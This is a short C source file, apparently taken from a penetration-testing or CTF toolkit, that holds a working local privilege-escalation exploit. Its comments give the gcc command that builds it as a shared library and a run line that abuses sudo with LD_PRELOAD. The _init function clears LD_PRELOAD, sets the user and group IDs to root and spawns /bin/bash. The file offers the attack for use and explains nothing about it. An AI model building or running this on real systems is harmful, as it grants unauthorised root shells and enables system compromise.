#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

/* COMPILE */
/* gcc -fPIC -shared shell.c -o shell.so -nostartfiles */

/* RUN */
/* BASED ON WHAT YOU CAN SUDO WITH */
/* sudo LD_PRELOAD=/path/to/compiled/shell/shell.so wget */

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}